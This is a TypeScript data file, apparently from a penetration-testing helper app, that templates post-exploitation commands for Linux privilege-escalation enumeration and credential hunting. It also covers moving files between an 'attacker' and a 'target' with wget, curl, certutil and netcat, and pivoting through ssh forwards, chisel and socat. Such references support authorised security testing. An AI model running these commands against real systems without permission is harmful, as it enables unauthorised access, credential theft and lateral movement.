export interface StaticCmd {
  id: string;
  label: string;
  command: string;
  link?: { label: string; url: string };
}

export const PRIVESC_ENUM: StaticCmd[] = [
  { id: 'id', label: 'Current identity', command: 'id' },
  { id: 'sudo-l', label: 'Sudo rights', command: 'sudo -l' },
  { id: 'uname', label: 'Kernel / OS info', command: 'uname -a' },
  {
    id: 'suid',
    label: 'SUID binaries',
    command: 'find / -perm -4000 -type f 2>/dev/null',
    link: { label: 'Cross-reference with GTFOBins', url: 'https://gtfobins.github.io/' },
  },
  {
    id: 'sgid',
    label: 'SGID binaries',
    command: 'find / -perm -2000 -type f 2>/dev/null',
    link: { label: 'Cross-reference with GTFOBins', url: 'https://gtfobins.github.io/' },
  },
  {
    id: 'capabilities',
    label: 'Linux capabilities',
    command: 'getcap -r / 2>/dev/null',
    link: { label: 'Cross-reference with GTFOBins', url: 'https://gtfobins.github.io/' },
  },
  { id: 'cron', label: 'Cron jobs', command: 'cat /etc/crontab 2>/dev/null; ls -la /etc/cron.*' },
  {
    id: 'writable-dirs',
    label: 'World-writable directories',
    command: 'find / -writable -type d 2>/dev/null | grep -v "^/proc"',
  },
  {
    id: 'cred-hunt',
    label: 'Credential hunting',
    command:
      'grep -rEl "password|passwd|pwd|secret|api[_-]?key" /etc /var/www /home 2>/dev/null | head -50',
  },
  { id: 'listening', label: 'Listening sockets', command: 'ss -tulpn' },
  { id: 'exports', label: 'NFS exports', command: 'cat /etc/exports 2>/dev/null' },
  { id: 'path', label: 'PATH (look for writable/hijackable dirs)', command: 'echo $PATH; ls -la $(echo $PATH | tr ":" " ")' },
];

export interface TransferCmd {
  id: string;
  label: string;
  build: (ip: string, port: string, file: string) => string;
  side: 'server' | 'client';
}

export const TRANSFER_CMDS: TransferCmd[] = [
  {
    id: 'py-http-server',
    label: 'Python HTTP server (on attacker)',
    side: 'server',
    build: (_ip, port) => `python3 -m http.server ${port}`,
  },
  {
    id: 'wget',
    label: 'wget (on target)',
    side: 'client',
    build: (ip, port, file) => `wget http://${ip}:${port}/${file} -O ${file}`,
  },
  {
    id: 'curl',
    label: 'curl -O (on target)',
    side: 'client',
    build: (ip, port, file) => `curl -O http://${ip}:${port}/${file}`,
  },
  {
    id: 'scp',
    label: 'scp (pull from target)',
    side: 'client',
    build: (ip, _port, file) => `scp user@${ip}:/path/to/${file} .`,
  },
  {
    id: 'certutil',
    label: 'certutil (Windows target)',
    side: 'client',
    build: (ip, port, file) => `certutil -urlcache -split -f http://${ip}:${port}/${file} ${file}`,
  },
  {
    id: 'impacket-smbserver',
    label: 'impacket-smbserver (on attacker)',
    side: 'server',
    build: () => `impacket-smbserver share $(pwd) -smb2support`,
  },
  {
    id: 'smb-copy',
    label: 'Copy via SMB share (on target, Windows)',
    side: 'client',
    build: (ip, _port, file) => `copy \\\\${ip}\\share\\${file} .`,
  },
  {
    id: 'base64-paste',
    label: 'Base64 paste (no network)',
    side: 'client',
    build: (_ip, _port, file) => `base64 -w0 ${file}   # copy output, then on the other side:\nbase64 -d <<< "PASTE_HERE" > ${file}`,
  },
  {
    id: 'nc-send',
    label: 'Netcat send (on attacker)',
    side: 'server',
    build: (_ip, port, file) => `nc -lvnp ${port} < ${file}`,
  },
  {
    id: 'nc-receive',
    label: 'Netcat receive (on target)',
    side: 'client',
    build: (ip, port, file) => `nc ${ip} ${port} > ${file}`,
  },
];

export interface PivotCmd {
  id: string;
  label: string;
  build: (localPort: string, remoteHost: string, remotePort: string, sshTarget: string) => string;
}

export const PIVOT_CMDS: PivotCmd[] = [
  {
    id: 'ssh-l',
    label: 'ssh -L (local port forward)',
    build: (localPort, remoteHost, remotePort, sshTarget) =>
      `ssh -L ${localPort}:${remoteHost}:${remotePort} ${sshTarget}`,
  },
  {
    id: 'ssh-r',
    label: 'ssh -R (remote port forward)',
    build: (localPort, remoteHost, remotePort, sshTarget) =>
      `ssh -R ${remotePort}:${remoteHost}:${localPort} ${sshTarget}`,
  },
  {
    id: 'ssh-d',
    label: 'ssh -D (dynamic SOCKS proxy)',
    build: (localPort, _remoteHost, _remotePort, sshTarget) => `ssh -D ${localPort} -N ${sshTarget}`,
  },
  {
    id: 'chisel-server',
    label: 'chisel server (on attacker)',
    build: (localPort) => `chisel server -p ${localPort} --reverse`,
  },
  {
    id: 'chisel-client',
    label: 'chisel client (on target, reverse SOCKS)',
    build: (localPort, remoteHost, remotePort) =>
      `chisel client ${remoteHost}:${remotePort} R:socks`,
  },
  {
    id: 'socat-pivot',
    label: 'socat (TCP relay)',
    build: (localPort, remoteHost, remotePort) =>
      `socat TCP-LISTEN:${localPort},fork TCP:${remoteHost}:${remotePort}`,
  },
];
